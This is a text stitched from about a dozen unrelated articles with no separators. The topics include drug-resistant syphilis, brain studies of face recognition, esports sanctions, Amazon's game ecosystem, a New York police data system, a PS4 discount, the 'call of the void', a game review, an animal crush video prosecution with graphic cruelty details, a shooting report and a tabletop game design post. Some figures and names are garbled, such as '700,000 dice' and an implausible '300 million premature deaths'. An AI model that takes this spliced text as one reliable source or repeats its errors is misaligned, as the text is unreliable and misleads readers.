Cases of the chronic bacterial infection have shot up by 71 per cent in England since 2011, according to the latest figures.
Syphilis cases are also increasingly more common in the US. Infections rose 15 percent between 2013 and 14; and another 19 percent from 2014 to 2015, according to CDC data.
Scientists are unsure just how many of these cases can be put down to the relatively new strain that is growing resistant to key antibiotics.
SYPHILIS: WHAT IS IT, WHAT ARE THE SYMPTOMS, AND HOW IS IT TREATED? What is it? A chronic bacterial disease, syphilis can be contracted by other means but is typically a sexually-transmitted disease. In very rare cases, it can be spread through prolonged kissing, as well as the more common routes of transmission: vaginal, anal and oral sex. It comes from the bacteria Treponema pallidum. What are the symptoms? Sufferers develop sores, though these can often go ignored. The infection develops in stages. Stage one: Small, painless sores (like ulcers) on genitals or in the mouth
Appear within 10-90 days after exposure
They disappear within six weeks, and do not leave a scar, before developing to stage two: Rosy rash on the palms of the hand and soles of the feet
Moist warts in the groin
White patches inside the mouth
Swollen glands
Fever
Weight loss
This all fades away without treatment before developing into stage three Latent syphilis: Dormant, no symptoms Stage three: Without treatment it can progress to more severe issues with the heart, brain and nerves
Paralysis
Blindness
Dementia
Deafness
Impotence
Death How is it treated? In the early stages, patients can receive an injection of Benzathine penicillin G. This will not undo the internal damage but will eliminate the infection. For those with latent syphilis - and are unsure how long they had it - doctors recommend having three doses of the penicillin injection, seven days apart from each other.
But they say the emergence of a drug-resistant form could make syphilis, a potentially fatal STI, even harder to treat.
A study of syphilis infections in 13 countries in 2012 to 2013 shows how a drug resistant strain of the disease is far more widespread than previously thought.
SS14-Ω is particularly resistant to the class of antibiotics called macrolides, the researchers from the University of Zurich say in the journal Nature Microbiology.
The possibility that the second-line medication for the disease - used when penicillin injections are not appropriate - might lose their effectiveness has alarmed experts.
Lola Stamm, an epidemiologist at the University of North Carolina, said the findings should serve as a warning to doctors not to oversubscribe antibiotics.
'Physicians need to be extremely wary about using macrolide drugs to treat syphilis,' she said.
Dr Stamm said syphilis wasn't yet resistant to multiple types of antibiotics - but she said that scenario could not be discounted in the future.
Doctors say that complacency and the difficulty in treating a disease that can remain symptomless for years has led to a rise in cases around the world.
Estimates suggest that there were 10.6 million cases worldwide in 2008, with many carrying the disease unaware they are actually infected.
Dr Yvonne Doyle, from Public Health England, said the return of syphilis was particularly worrying in London - which has increased by 163 per cent since 2010.
'While we've seen increases in many STIs in recent years, syphilis is fast emerging as a serious public health concern in the capital,' she said.
Cases of syphilis have been reported among both heterosexuals and men who have sex with men - but the latter group has been more affected.
Commonly, someone who is infected with syphilis may develop a painless ulcer or rash on the genitals, rectum or inside the mouth within a month.
Secondary syphilis will then follow. This is characterised by general symptoms such as a fever, headaches and night sweats.
If this is not treated with antibiotics it can then progress into late stage syphilis.
At this point the disease causes much more serious health complications that can include cardiovascular problems, central nervous disease and paralysis -- and can prove be fatal.
Doctors say regular sexual health check ups in sexually active people are the key to preventing the disease.
This comes after research commissioned by then Prime Minister David Cameron found antibiotic resistance will have caused 300 million premature deaths.
Globally, at least 700,000 dice each year of drug resistance in illnesses such as bacterial infections, malaria, HIV/Aids or tuberculosis.
As you can see from the picture here, we naturally tend to see objects that resemble faces everywhere. Be it clouds, tortilla's, bits of toast or odd-shaped hills on Mars, the pattern recognition engine between your ears does an amazing job. Now, what is interesting is that it is just a resemblance, you can also at the same time recognise that it is not an actual face. Some have recognised this and as a result some fascinating research has now been published.
“You can tell that it has some ‘faceness' to it, but on the other hand, you're not misled into believing that it is a genuine face,” – Observes Pawan Sinha, professor of brain and cognitive sciences at MIT.
OK, so what is going on here, how is it possible to sort of see a face, but at the same time not see an actual face?
Well we now have an answer from the new study that has been published by Sinha and his colleagues, entitled “Lateralization of face processing in the human brain“. As announced by MIT News, what they have discovered is that two separate brain regions make the analysis.
First we have the fusiform gyrus — an area long associated with face recognition — on the left side of the brain carefully calculates how “facelike” an image is.
Then we have the right fusiform gyrus which appears to use that information to make a quick, categorical decision of whether the object is, indeed, a face.
This distribution of labor is one of the first known examples of the left and right sides of the brain taking on different roles in high-level visual-processing tasks, although hemispheric differences have been seen in other brain functions, most notably language and spatial perception. It also explains why we sort of see a face, but at the same time are not fooled into thinking it is an actual face.
Face versus nonface
Sinha and his students set out to investigate how that brain region decides what is and is not a face, particularly in cases where an object greatly resembles a face.
To help them do that, the researchers created a continuum of images ranging from those that look nothing like faces to genuine faces. They found images that very closely resemble faces by examining photographs that machine vision systems had falsely tagged as faces. Human observers then rated how facelike each of the images were by doing a series of one-to-one comparisons; the results of those comparisons allowed the researchers to rank the images by how much they resembled a face.
The research team then used functional magnetic resonance imaging (fMRI) to scan the brains of research subjects as they categorized the images. Unexpectedly, the scientists found different activity patterns on each side of the brain as follows:
On the right side, activation patterns within the fusiform gyrus remained quite consistent for all genuine face images, but changed dramatically for all nonface images, no matter how much they resembled a face. This suggests that the right side of the brain is involved in making the categorical declaration of whether an image is a face or not.
Meanwhile, in the analogous region on the left side of the brain, activity patterns changed gradually as images became more facelike, and there was no clear divide between faces and nonfaces. From this, the researchers concluded that the left side of the brain is ranking images on a scale of how facelike they are, but not assigning them to one category or another.
“From the computational perspective, one speculation one can make is that the left does the initial heavy lifting,” Sinha says. “It tries to determine how facelike is a pattern, without making the final decision on whether I'm going to call it a face.”
The researchers also found that activation in the left side of the fusiform gyrus preceded that of the right side by a couple of seconds, supporting the hypothesis that the left side does its job first and then passes information on to the right side.
Sinha says that given the sluggishness of MRI signals (which rely on blood-flow changes), the timing does not yet constitute definitive evidence,
“but it's a very interesting possibility because it begins to tease apart this monolithic notion of face processing. It's now beginning to get at what the constituents are of that overall face-processing system.”
What happens Next?
The researchers hope to obtain more solid evidence of temporal relationships between the two hemispheres with studies using electroencephalography (EEG) or magnetoencephalography (MEG), two technologies that offer a much more precise view of the timing of brain activity.
They also hope to discover how and when the right and left sides of the fusiform gyrus develop these independent functions by studying blind children who have their sight restored at a young age. Many such children have been treated by Project Prakash, an effort initiated by Sinha to find and treat blind children in India.

The most drastic sanctions in esports history could have a dramatic effect on big players getting into the industry.
Sunday's announcement by League of Legends publisher Riot Games that it had kicked out two professional teams and an amateur team from its leagues could slow down the wave of investors lining up to get into the industry. Editor's Picks League of Legends shakeup: Three teams must sell Riot dropped the hammer on three League of Legends teams, citing multiple rules violations. The organizations have until 11:59 p.m. PT on May 18 to sell their spots.
Erzberger: Reevaluating the state of Riot's Challenger Series No more constant roster swaps and half measures. Riot needs to implement new rules if it wants the Challenger Series to stay relevant.
In Retrospect: Post-Groups MSI Power Rankings The gods of League of Legends showed they can bleed too -- but does that mean it's the end for them? 2 Related
"It should and would give buyers pause to make sure the diligence is really done," said one executive of a pro sports team looking to make the move into esports. "The diligence with these teams is a challenge."
In the first ruling, Riot kicked out two teams, Renegades and Team Dragon Knights. In a statement posted online, Riot director of esports Whalen Rozelle said, "Renegades management has been found to have knowingly violated the competitive ban against Chris Badawi, misrepresented their relationship with TDK, and compromised player welfare and safety."
Riot's latest penalty is based on findings that the Renegades' owner, Christopher "MonteCristo" Mykles, promised Badawi a 50 percent share in the team's return, a violation of the first ban put in place by Riot. The charge against TDK, a challenger team, is that the Renegades and TDK misrepresented their professional relationship, including housing and compensating players after trades.
Riot found that another League of Legends team, Team Impulse, didn't have signed contracts with most of its players and often missed payments to the players themselves.
Riot is allowing all three teams to try to sell their spots by end of the day on May 18, but that could prove difficult since the sale wouldn't include the players' contracts. Some Renegades players have already left the team, such as Aleš "Freeze" Kněžínek, while others have already announced that they're looking for new opportunities, such as Alexey "Alex Ich" Ichetovkin.
"At least one team told ESPN.com on Monday that the recent sanctions significantly slowed down their investment timeline, adding another complication to the quickly evolving space. "
In recent months, big names have come into esports, including Sacramento Kings minority partners Andrew Miller and Mark Mastrov, who bought NRG, which competes in the North American League of Legends (as did Renegades and Impulse). Shaquille O'Neal, Alex Rodriguez and Jimmy Rollins also purchased equity in the team.
Many sports teams are looking to make a move into esports. A representative for the Miami Dolphins told ESPN on Monday that the organization is preparing to jump into the fray.
"Esports is real, it's a fact," said Matt Higgins, co-founder of Stephen Ross' RSE Ventures and vice chair of the Miami Dolphins. "When you have tens of millions of people engaging online, eventually sponsors and rights buyers take notice. It's inevitable. We've been studying the space and plan to get involved very soon."
Since the space represents a disorganized Wild West for executives in the four major North American sports leagues who are used to structure and standard player contracts, those who want to invest are having to take a deep dive into how they'd profit before they sink their dollars into a team. At least one team told ESPN.com on Monday that the recent sanctions significantly slowed down their investment timeline, adding another complication to the quickly evolving enterprise.
Following months of speculation, Amazon Game Studios has finally revealed what it's been working on for the past few years. Surprisingly, it's not a single launch title that's been announced at the Unboxing event, with three related titles sharing the stage. All of them have a strong online component, utilised in a way that's familiar to gamers. There's an arena brawler in Breakaway, and a gorgeous sandbox MMO named New World. Further on out, Crucible covers the survival side, with a Highlander-style sole-survivor twist.

Crucially, however, all are underpinned by the same carefully curated ecosystem. All three make heavy use of Twitch, including interesting concepts around audience participation. All three are built on Lumberyard, Amazon's proprietary development engine, and utilise the AWS Cloud. And all three will likely have a community of engaged content creators (and ancillary services like voice chat) through Curse.
This is Amazon's real pitch: a potentially huge shakeup to the core of PC gaming. If you're a studio looking to build an online game, Amazon's hoping to offer you the whole package: engine, hosting, storefront and community. While it will certainly help if its own titles are commercially successful, it's almost immaterial. All it has to do is prove that the technology works, end to end, at scale. Manage that, and everyone from the small indie to the large AAA will be interested in what Amazon has to offer.
That's not to say that the games don't have to make money, or to belittle the efforts of the talented teams producing them. Amazon is a business, and it would certainly help to recoup some of their development costs. But they're also technical demos to showcase the capability and potential of the ecosystem, and inspire other developers to consider taking the plunge.
Cloud History
In all likelihood, two seeds were probably behind Amazon's strategy. One was likely FireFall, a beleaguered MMO that nonetheless pioneered using Amazon's cloud services to host almost all game components, allowing the studio to scale rapidly where needed and expand easily into Europe. While the title itself didn't perform as well as hoped, the experience was likely valuable for teams on both sides.
The other seed was probably Hero Engine, the oft-maligned codebase behind Star Wars: The Old Republic and The Elder Scrolls Online, as well as several other indie efforts. While this path has given studios a leg up in the development process, I'm also told that the engine required heavy customisation in order to produce a unique experience, creating a technical debt that still lingers with every game update.
Additionally, there's the recent explosion of survival-sandbox experiences. Grab a copy of Unreal Engine or Unity, some hosting, and some luck at Greenlight, and you've got yourself a chance at Steam Early Access. It's a well-trodden path that's spawned some entertaining gems and absolute dross, depending on how much you're a fan of the sub genre.
All of these are strong indicators that there's a demand that Amazon can play to, as long as the firm can offer a cheaper service that's easier to use and provides a faster route to market than the alternatives. Now that the complete ecosystem is unveiled, there's one acid test remaining: does it all actually work? That's why the three opening titles from Amazon Game Studios are vital, and why other studios will be watching their progress as intensely as gamers.
Cloud Forecast
The announcement isn't going to be good news for everyone, particularly those that have done well from the status quo. Epic and Unity will need to look beyond game engines and start establishing ecosystems of their own, as well as strengthening educational ties to ensure a constant feed of fresh developers. Services like Discord and Forge.gg are ripe targets for being snapped up on order to offer the richer ecosystem.
Even Valve, the current de-facto destination for PC gaming, might find itself under threat. Source 2 has struggled to gain traction beyond DOTA 2 and a couple of niche titles. Likewise, the Steam store mainly carries weight because of its immense popularity with gamers and in-built community. If Amazon's new ecosystem begins to gain traction, it has the potential to become a compelling destination for highly online gaming, leaving Steam as a curator of predominantly offline and isolated titles.
All that said, none of this will happen overnight. Outside of this opening gambit, Amazon likely has its hands full with an immense amount of engineering effort, architecting and designing an integrated experience that lets me hop from Twitch, to Curse, to Curse Voice, to Store, to Game, with a single identity, and yet without damaging any of the unique brands that made those elements so successful. It's already happening, with the Curse app now hooking into Twitch accounts, and Amazon Prime members now getting Twitch perks.
Either way, PC gaming looks set to have its biggest shake-up in years, and I can't wait to watch it all unfold.
System has live video feeds, huge databases of recent crime patterns and can take input direct from the field in real time
New York mayor Michael Bloomberg has unveiled a new crime-fighting system developed with Microsoft – and revealed that the city will take a cut of the profits if it is sold to other administrations.
The innovation, which bears a passing resemblance to the futuristic hologram data screens used by Tom Cruise in the science fiction film Minority Report, will allow police to quickly collate and visualise vast amounts of data from cameras, licence plate readers, 911 calls, police databases and other sources.
It will then display the information in real time, both visually and chronologically, allowing investigators to centralise information about crimes as they happen or are reported. "It is a one-stop shop for law enforcement," Bloomberg said at a City Hall press conference unveiling the new technology.
But, though it has many screens, maps, and flashing visuals that make it look like science fiction, the new technology has a distinctly un-Hollywood name: the Domain Awareness System. Developed by Microsoft engineers working with New York police officers, DAS will allow a host of activities to be carried out, such as spotting a suspicious vehicle and being able to track its recent movements or use cameras to track back and see who left a suspicious package.
It features live video feeds, huge databases of recent crime patterns and can take input direct from the field in real time via things like 911 calls or police radios. "All the information is presented visually and geographically and in chronological context," said police commissioner Ray Kelly.
But there is more to the new system than just fighting crime in a city that has in recent decades shed a once fearsome reputation to become one of the safest big metropolitan areas in America. Part of the deal with Microsoft will result in the city of New York taking a 30% cut on any profits that the computer firm gets from selling the technology to other cities in America or around the world.
"Maybe we can make a few bucks," Bloomberg said. "It is a great example of what the public and private sector can do to improve people's lives when we work together."
Such partnerships with the private sector, especially in sensitive areas like law enforcement, are not without their critics who are concerned about introducing a profit motive into the traditional domain of public social policy. But they are becoming a Bloomberg specialism.
He recently announced an agreement with investment bank Goldman Sachs to issue a loan, called a "social impact bond", that will fund a scheme to cut re-offending rates among young people leaving New York's notorious Rikers Island jail. If the scheme beats certain targets of youth behaviour Goldman could make several million dollars of profit.
If you want to make a last-minute purchase of a PS4 before Christmas, you might want to do it at Walmart. The retailer's offering the console at a substantial discount.This weekend Walmart quietly brought the price of the 500GB PS4 down to $329 , making it seventy bucks cheaper than normal. The only catch is that you can't buy it online. You'll have to go to the store to pick up the console.The reduction in price was only applied to the standard package. The bundles with your choice of game still cost the usual amount.The last time the PS4 was this cheap was Black Friday, the start of the holiday shopping season. It seems Walmart thinks that there's still plenty of money to be made at the end of the holiday season, too. No other retailer seems to be matching the offer currently.The discount makes the PS4 around $20 cheaper than the Xbox One . Microsoft cut the price of the XB1 from $399 to $349 for the holiday season. This new price extended to special compilations like the Assassin's Creed bundle , which meant that new Xbox One owners were getting free games in addition to a cheaper console.These price cuts can be very effective. The price cut on Xbox One allowed it to beat the PS4 in North American sales in November , breaking a long-winning streak by Sony's console.Had Sony been willing to match or undercut the Xbox One's new price across all retailers, it's possible the PS4 could have wound up ahead. That would've required them to take a big hit on their profits for these sales, though. Sony apparently felt that getting into a price war with Microsoft this holiday season wasn't worthwhile now that PS4 has a comfortable lead in total sales Walmart doesn't indicate when this deal will expire. Presumably it will run out in early January. Even if there's no firm end date, the deal is dependent on their supply. Should the stores in your area sell all of their PS4's, you're out of luck. If you're looking to buy a PS4, you should pull the trigger on this one as quick as you can.
Ever feel like jumping off a cliff for no reason? Maria Mandic explores the fascinating science behind why we often find ourselves contemplating doing insanely dangerous things
Standing at the top of the Eiffel tower on a beautiful, sunny day in Paris, my first thought was ‘I could jump'. Not ‘What a stunning view of a culturally rich metropolis' or ‘I wonder what the City of Light looks like at nighttime', but ‘I could jump off of this tower in just one leap', and I wondered why. A quick search on Google showed me that I wasn't alone. There were numerous paranoid reddit threads, tumblr posts and definitions, from Collins to Urban Dictionary, demanding explanations for their seemingly suicidal urges.
Digging a little deeper, driven mostly by morbid curiosity but also by a slight doubt of my own sanity, I found that the temptation we feel when we're standing on the edge of a cliff to take a step forwards and fall into oblivion is so common that the French actually have a name for it; ‘L'appel du Vide'. When translated into English, it means ‘Call of the Void' and unlike most foreign idioms, this one makes sense even when translated literally.
Some more research yielded scholarly articles, which gave the French phrase a proper English translation termed ‘High Place Phenomenon' (HPP). A study conducted in 2012 at Florida State University on 431 undergraduate college students investigated the volunteers' experience with HPP, depressive and anxiety symptoms, suicidal ideation and behavioural history.
The original explanation for the phenomenon was suicidal ideation but when such a high number of participants reported feelings associated with what is now known as HPP, even those with no history of suicidal thoughts, the idea of HPP was born. The study reported experiences of HPP with those who have suicidal thoughts and those who don't, suggesting this was a concept separate from suicide ideation and perhaps something most people experience in their lifetime.
However, the phrase High Place Phenomenon is misleading. The same concept can be applied to the impulse you get when driving and you feel the need to suddenly swerve and crash into a tree or abruptly jerk the steering wheel to the left on a bridge. I'm sure you are familiar with the scenario in a tube station, you see the train approaching the platform, you're near the tunnel it's exiting and you feel your knees stiffen as the impulse to jump in front of the train flashes through your mind. These examples still adhere to the concept of HPP as the apparent suicidal intention is still present, but in different forms of self-destruction.
The study suggested the reason for this phenomenon was a misinterpretation of a safety or survival signal, with fear playing a huge role. If an individual is more sensitive to these safety signals, then they will be more likely to experience the phenomenon. This is especially true for people with higher levels of anxiety as they have a higher tendency to misinterpret environmental and bodily signals. For example, when I was walking on top of the Eiffel tower, I wandered near to the edge where there's a railing and metal cage enclosing the space. As I leaned into the cage I saw the sharp drop from the top of the tower to the ground and inadvertently stepped back. I then became aware of the fact that I wasn't in any actual danger as it was perfectly safe. So why did my mind tell my body to step backwards? It could be because I wanted to jump and my brain was in fact saving me.
This supports the previous study's title ‘An urge to jump affirms the urge to live', as the experience of the phenomenon could in fact reflect an individual's sensitivity to internal signals which in turn affirms their will to live. The idea put forward by Sigmund Freud of a “death wish” where he stated that ‘everything living dies for internal reasons' and ‘the aim of all life is death' could explain the impulse to jump off of high places. It is proposed that the phenomenon actually demonstrates the strength of the survival instinct. Therefore, even with Freud's proposal of such emotions being present in the human brain, we continue to avoid danger when confronted with the Call of the Void.
Russia has hit back at a human rights report accusing it of committing war crimes in Syria, dubbing it “politically-motivated and fabricated”.
Amnesty International released a report on Wednesday presenting what it said is hard evidence that Russia has violated international law during its air campaign in Syria by hitting targets like medical facilities and a busy market.
The report documents the deaths of hundreds of civilians, and around a dozen fighters, in Russian air strikes launched since September.
Some attacks "appear to have directly attacked civilians or civilian objects by striking residential areas with no evident military target and even medical facilities", said Amnesty's Middle East director Philip Luther.
"Such attacks may amount to war crimes," he said, adding that it "is crucial that suspected violations are independently and impartially investigated".
The spokesperson for Russia's Foreign Ministry, Maria Zakharova, told a press conference in Moscow on Thursday that the report was “politically-motivated and fabricated”.
Zakharova criticised the human rights organisation for using unidentified sources in the report, saying it relied on “false data".

A longstanding dream: Video games will evolve into interactive stories, like the ones that play out fictionally on the Star Trek Holodeck . In this hypothetical future, players could interact with computerized characters as round as those in novels or films, making choices that would influence an ever-evolving plot. It would be like living in a novel, where the player's actions would have as much of an influence on the story as they might in the real world. It's an almost impossible bar to reach, for cultural reasons as much as technical ones. One shortcut is an approach called environmental storytelling . Environmental stories invite players to discover and reconstruct a fixed story from the environment itself. Think of it as the novel wresting the real-time, first-person, 3-D graphics engine from the hands of the shooter game. In Disneyland's Peter Pan's Flight , for example, dioramas summarize the plot and setting of the film. In the 2007 game BioShock , recorded messages in an elaborate, Art Deco environment provide context for a story of a utopia's fall. And in What Remains of Edith Finch , a new game about a girl piecing together a family curse, narration is accomplished through artifacts discovered in an old house.
The approach raises many questions. Are the resulting interactive stories really interactive, when all the player does is assemble something from parts? Are they really stories, when they are really environments? And most of all, are they better stories than the more popular and proven ones in the cinema, on television, and in books? On this measure, alas, the best interactive stories are still worse than even middling books and films. That's a problem to be ignored rather than solved. Games' obsession with story obscures more ambitious goals anyway. * * * In retrospect, it's easy easy to blame old games like Doom and Duke Nukem for stimulating the fantasy of male adolescent power. But that choice was made less deliberately at the time. Real-time 3-D worlds are harder to create than it seems, especially on the relatively low-powered computers that first ran games like Doom in the early 1990s. It helped to empty them out as much as possible, with surfaces detailed by simple textures and objects kept to a minimum. In other words, the first 3-D games were designed to be empty so that they would run. An empty space is most easily interpreted as one in which something went terribly wrong. Add a few monsters that a powerful player-dude can vanquish, and the first-person shooter is born. The lone, soldier-hero against the Nazis, or the hell spawn, or the aliens. Those early assumptions vanished quickly into infrastructure, forgotten. As 3-D first-person games evolved, along with the engines that run them, visual verisimilitude improved more than other features. Entire hardware industries developed around the specialized co-processors used to render 3-D scenes. To dream of the Holodeck is to dream a complicated dream of the novel. Left less explored were the other aspects of realistic, physical environments. The inner thoughts and outward behavior of simulated people, for example, beyond the fact of their collision with other objects. The problem becomes increasingly intractable over time. Incremental improvements in visual fidelity make 3-D worlds seem more and more real. But those worlds feel even more incongruous when the people that inhabit them behave like animatronics and the environments work like Potemkin villages.
Worse yet, the very concept of a Holodeck-aspirational interactive story implies that the player should be able to exert agency upon the dramatic arc of the plot. The one serious effort to do this was an ambitious 2005 interactive drama called Façade , a one-act play with roughly the plot of Who's Afraid of Virginia Woolf. It worked remarkably well—for a video game. But it was still easily undermined. One player, for example, pretended to be a zombie , saying nothing but “brains” until the game's simulated couple threw him out. Environmental storytelling offers a solution to this conundrum. Instead of trying to resolve the matter of simulated character and plot, the genre gives up on both, embracing scripted action instead. The player's experience becomes that of a detective, piecing together narrative coherence from fragments conveniently left behind in the game's physical environment. If the ultimate bar for meaning in games is set at teen fare, then perhaps they will remain stuck in a perpetual adolescence. In between bouts of combat in BioShock, for instance, the recordings players discover have no influence on the action of the game, except to color the interpretation of that action. The payoff, if that's the right word for it, is a tepid reprimand against blind compliance, the very conceit the BioShock player would have to embrace to play the game in the first place. In 2013, two developers who had worked on the BioShock series borrowed the environmental-storytelling technique and threw away both the shooting and the sci-fi fantasy. The result was Gone Home , a story game about a college-aged woman who returns home to a mysterious, empty mansion near Portland, Oregon. By reassembling the fragments found in this mansion, the player reconstructs the story of the main character's sister and her journey to discover her sexual identity. The game was widely praised for breaking the mold of the first-person experience while also importing issues in identity politics into a medium known for its unwavering masculinity.
Feats, but relative ones. Writing about Gone Home upon its release , I called it the video-game equivalent of young-adult fiction. Hardly anything to be ashamed of, but maybe much nothing to praise, either. If the ultimate bar for meaning in games is set at teen fare, then perhaps they will remain stuck in a perpetual adolescence even if they escape the stereotypical dude-bro's basement. Other paths are possible, and perhaps the most promising ones will bypass rather than resolve games' youthful indiscretions. * * * What Remains of Edith Finch both adopts and improves upon the model set by Gone Home. It, too, is about a young woman who returns home to a mysterious, abandoned house in the Pacific Northwest, where she discovers unexpected and dark secrets. The titular Edith Finch is the youngest surviving member of the Finch family, Nordic immigrants who came to the Seattle area in the late 19th century. It is a family of legendary, cursed doom, an affliction that motivated emigration. But once they arrived on Orcas Island, fate treated the Finches no less severely—all its lineage has been doomed to die, and often in tragically unremarkable ways. Edith has just inherited the old family house from her mother, the latest victim of the curse. As in Doom and BioShock and almost every other first-person game ever made, the emptiness of the environment becomes essential to its operation. 3-D games are settings as much as experiences—perhaps even more so. And the Finch estate is a remarkable setting, imagined and executed in intricate detail. This is a weird family, and the house has been stocked with handmade gewgaws and renovated improbably, coiling Dr. Seuss-like into the air. The game is cleverly structured as a series of a dozen or so narrative vignettes, in which Edith accesses prohibited parts of the unusual house, finally learning the individual fates of her forebears by means of the fragments they left behind—diaries, letters, recordings, and other mementos. The game industry has long dreamed of overtaking Hollywood to become the “medium of the 21st century.” The result is aesthetically coherent, fusing the artistic sensibilities of Edward Gory, Isabel Allende, and Wes Anderson. The writing is good, an uncommon accomplishment in a video game. On the whole, there is nothing to fault in What Remains of Edith Finch. It's a lovely little title with ambitions scaled to match their execution. Few will leave it unsatisfied.
And yet, the game is pregnant with an unanswered question: Why does this story need to be told as a video game? The whole way through, I found myself wondering why I couldn't experience Edith Finch as a traditional time-based narrative. Real-time rendering tools are as good as pre-rendered computer graphics these days, and little would have been compromised visually had the game been an animated film. Or even a live-action film. After all, most films are shot with green screens, the details added in postproduction. The story is entirely linear, and interacting with the environment only gets in the way, such as when a particularly dark hallway makes it unclear that the next scene is right around the corner. One answer could be cinema envy. The game industry has long dreamed of overtaking Hollywood to become the “ medium of the 21st century ,” a concept now so retrograde that it could only satisfy an occupant of the 20th. But a more compelling answer is that something would be lost in flattening What Remains of Edith Finch into a linear experience. The character vignettes take different forms, each keyed to a clever interpretation of the very idea of real-time 3-D modeling and interaction. In one case, the player takes on the role of different animals, recasting a familiar space in a new way. In another, the player moves a character through the Finch house, but inside a comic book, where it is rendered with cell-shading instead of conventional, simulated lighting. In yet another, the player encounters a character's fantasy as a navigable space that must be managed alongside that of the humdrum workplace in which that fantasy took place. To use games to tell stories is a fine goal, but it's also an unambitious one. These are remarkable accomplishments. But they are not feats of storytelling, at all. Rather, they are novel expressions of the capacities of a real-time 3-D engine. The ability to render light and shadow, to model structure and turn it into obstacle, to trick the eye into believing a flat surface is a bookshelf or a cavern, and to allow the player to maneuver a camera through that environment, pretending that it its a character. Edith Finch is a story about a family, sure, but first it's a device made of the conventions of 3-D gaming, one as weird and improvised as the Finch house in which the action takes place. Such repurposing was already present in earlier environmental story-games, including Gone Home and Dear Esther , another important entry in the genre that prides itself on rejecting the “traditional mechanics” of first-person experience. For these games, the glory of refusing the player agency was part of the goal. So much so that their creators even embraced the derogatory name “walking simulator,” a sneer invented for them by their supposedly shooter-loving critics.
But walking simulators were always doomed to be a transitional form. The gag of a game with no gameplay might seem political at first, but it quickly devolves into conceptualism. What Remains of Edith Finch picks up the baton and designs a different race for it. At stake is not whether a game can tell a good story or even a better story than books or films or television. Rather, what it looks like when a game uses the materials of games to make those materials visible, operable, and beautiful. * * * Think of a a medium as the aesthetic form of common materials. Poetry aestheticizes language. Painting aestheticizes flatness and pigment. Photography does so for time. Film, for time and space. Architecture, for mass and void. Television, for economic leisure and domestic habit. Sure, yes, those media can and do tell stories. But the stories come later, built atop the medium's foundations. What are games good for, then? Players and creators have been mistaken in merely hoping that they might someday share the stage with books, films, and television, let alone to unseat them. To use games to tell stories is a fine goal, I suppose, but it's also an unambitious one. Games are not a new, interactive medium for stories. Instead, games are the aesthetic form of everyday objects. Of ordinary life. Take a ball and a field: you get soccer. Take property-based wealth and the Depression: you get Monopoly . Take patterns of four contiguous squares and gravity: you get Tetris. Take ray tracing and reverse it to track projectiles: you get Doom. Games show players the unseen uses of ordinary materials.

WARNING: The following article contains graphic descriptions of animal abuse that may be disturbing to some readers.
HOUSTON, Texas – A Houston woman pleaded guilty to charges she filmed herself torturing and killing small animals for the sexual enjoyment of her viewers.
According to the U.S. Attorney's Office, Ashley Nicole Richards, 24, filmed eight “animal crush” videos of herself mutilating and killing puppies, kittens and chickens between February 2010 and August 2012.
“Animal crush” videos depict women intentionally crushing, burning, suffocating, impaling or otherwise causing serious injury to small animals with the purpose of achieving sexual gratification for their viewers. These videos have been illegal since 2010, prosecutors said.
Authorities say in one 13-minute video entitled “Pupp2,” Richards is seen mutilating and killing a blue pit bull-mix puppy with its mouth bound with duct tape.
Richards is seen striking the dog numerous times with a meat cleaver, cutting off one of his paws, then its head and neck, prosecutors said. She beheads the dog and urinates on its body. In another video, she steps on a cat's eye with a high heel shoe, prosecutors said.
Richards appears “scantily clad” in the videos, wearing a mardi gras type mask. She also speaks to the viewer in a sexual manner throughout the videos, prosecutors said.
She was arrested on state charges in August 2012, and indicted by a federal grand jury in November of that year. On Tuesday, she pleaded guilty to all five counts against her – four counts of producing and one count of distributing animal crush videos.
She will be sentenced in December. She faces up to seven years in federal prison on each count of conviction, and a possible $250,000 fine.

ALAMEDA — The victim of a Saturday night shooting outside an Alameda bowling alley was just 19 years old, police said Sunday evening.
The young man was rushed to Highland Hospital, where he died. Police did not release his name on Sunday, but revealed more details about the tragic incident.
The shooting happened just after 9 p.m. Saturday, said Alameda Police Lt. Matt McMullen. He said police received calls from people who heard gunshots near the AMF Southshore Lanes bowling alley at 300 Park St.
McMullen said he would not reveal the exact location of the shooting this early in the investigation, but that the crime happened “in the vicinity” of the bowling alley.
The business is directly across the street from the Alameda South Shore Center shopping mall, where a seasonal ice rink frequented by children and families was open at the time of the shooting.
Monica Carney, an operations manager at AMF Southshore Lanes, confirmed Sunday that a shooting had taken place Saturday night in the parking lot. Carney said she first received word of the incident via text at 9:45 Saturday evening.
“Police locked the doors with all the staff inside around 9:30,” Carney said, adding that officers remained on scene overnight and into Sunday morning.
At midday Sunday, the bowling alley was open, and customers were inside again. No evidence of the previous night's activity was apparent, save for a lone police cruiser departing the scene.
McMullen said there were “several people in the area” at the time of the shooting and that police were interviewing them “and making sure we have true and accurate accounts.” Police have yet to identify a suspect, he said.
He said he could not confirm with certainty whether the victim had been inside the bowling alley before the shooting.
“It's super-, super-tragic,” McMullen said. “Our hearts and our thoughts are out to the victim and their family. We're doing all we can with the resources we have to continue the investigation to find leads and hopefully find some kind of closure.”

Changeling: The Lost, The Hedge
Changeling: The Lost, Open Development
Hey everyone!
Working on wrapping Changeling: The Lost Second Edition. A while ago, I posted the bulk of the rules, and I've been integrating a ton of playtest notes and tweaking this, that, or the other thing. We're in the home stretch on the text.
One thing I've been asked more than a few times about was the way we were handling the Hedge in 2E. The answer to that is, “basically the same, but with some minor fussing and emphasis changes”. For example, the Hedge was always more than just literal thorns. It's called out in the description in the previous edition pretty clearly. However, you might not notice if you forgot that short paragraph and just paid attention to other material about the Hedge. So, in 2E, I want to be very clear and present about the fact that the Hedge's brambles aren't always literal. This is mostly just a tonal change though.
I've got new, pretty simplified systems for navigating the Hedge, for warping the Hedge physically, for Hedge duels, and a few other minor things. I didn't have a ton of word count to devote to this, so I wanted to favor basic foundations. And, if you've been following the discussions, you know that “The Hedge” is the tentative name of our first supplement. So, we'll be giving that a lot of love, and sooner than later.
The one thing you'll get a nice hint of here, but you'll see more of in The Hedge is the ability to change Seemings. It's the kind of rare, focus-of-multiple-stories type thing that I feel gave us some fun space to play with the agency changelings take over their condition.
This segment is notably shorter than the original. Again, space constraints are a real thing, and I think we have a lot of room to expand and let it develop into something more beautiful and terrifying with our first supplement.
Anyway, here's some Hedge. I hope you dig it as much as I enjoyed writing it.
Edit: I made some minor changes about six hours after posting this. I added some description text under “Pain and the Hedge” to add more explicit dichotomy between beautiful and dark aspects. I clarified Master Shaper to allow for human characters. I clarified some rules about warping the Hedge. I added a minor reference to Dream Bastions in the reasons changelings travel to the Hedge. I made it clear what happens to warped objects when they're taken from the Hedge into the human world.
